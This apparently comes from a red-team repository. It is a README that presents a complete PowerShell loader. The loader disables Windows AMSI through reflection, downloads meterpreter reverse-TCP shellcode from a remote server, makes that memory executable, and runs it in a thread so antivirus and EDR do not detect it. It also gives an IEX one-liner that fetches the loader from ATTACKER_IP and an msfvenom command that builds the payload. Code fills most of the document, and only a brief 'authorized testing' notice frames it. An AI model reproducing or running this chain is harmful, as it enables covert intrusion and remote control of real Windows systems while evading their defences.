# AMSI Bypass + In-Memory PowerShell Loader

This repository demonstrates a common technique used in red team operations and penetration testing to bypass **AMSI (Antimalware Scan Interface)** and execute shellcode directly in memory without touching the disk. This approach is particularly useful to evade static and runtime detections by antivirus and EDR solutions.

## üîç Overview

During a penetration testing engagement on a Windows 10 Pro (Build 19045) system, this PowerShell-based loader was used to download and inject a meterpreter reverse TCP shellcode (`mt.raw`) directly into the memory of the current process. The payload was executed without creating files on the filesystem, minimizing the forensic footprint and circumventing disk-based scanning.

## üõ†Ô∏è Script Logic

```powershell
[string1] = "System.Management.Automation.Amsi" + "Utils"
[string2] = "amsiInit" + "Failed"
[type]   = [Ref].Assembly.GetType($string1)
[field]  = $type.GetField($string2, [Reflection.BindingFlags]"NonPublic,Static")
$field.SetValue($null, $true)

$data = (New-Object Net.WebClient).DownloadData('http://192.168.1.13/mt.raw')
$size = $data.Length
$addr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
[System.Runtime.InteropServices.Marshal]::Copy($data, 0, $addr, $size)

Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
'@ -Name NativeMethods -Namespace Win32
[Win32.NativeMethods]::VirtualProtect($addr, [uint32]$size, 0x40, [ref][uint32]0)

$kernel32Type = Add-Type -MemberDefinition @'
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
'@ -Name Kernel32Functions -Namespace Win32

$hThread = [Win32.Kernel32Functions]::CreateThread(0, 0, $addr, 0, 0, 0)
[Win32.Kernel32Functions]::WaitForSingleObject($hThread, 0xFFFFFFFF)

```

üîê What This Script Does
Bypass AMSI by patching the field amsiInitFailed to true, disabling its runtime functionality.
Download a raw payload from a remote attacker-controlled web server (mt.raw).
Allocate memory using AllocHGlobal and copy the payload into it.
Set memory protection to PAGE_EXECUTE_READWRITE to allow payload execution.
Spawn a new thread pointing to the payload, enabling execution without disk writes.
‚ö†Ô∏è Security Notice
This technique is for authorized penetration testing only.
It is designed to avoid detection from static and runtime AV systems ‚Äî use responsibly.
Never run unknown PowerShell scripts without full understanding of their consequences.
üß™ Example Usage
You can run the script from a Meterpreter session or standalone PowerShell prompt with appropriate permissions:

powershell

```

IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/loader.ps1')

```
Or locally:

powershell


```
.\loader.ps1
```

Ensure your payload (mt.raw) is prepared via msfvenom:

bash

```

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.13 LPORT=4444 -f raw -o mt.raw

```

‚úÖ Requirements
Windows PowerShell 5.1 or PowerShell Core 7+
.NET Framework and Reflection support
Internet access (if downloading the payload remotely)
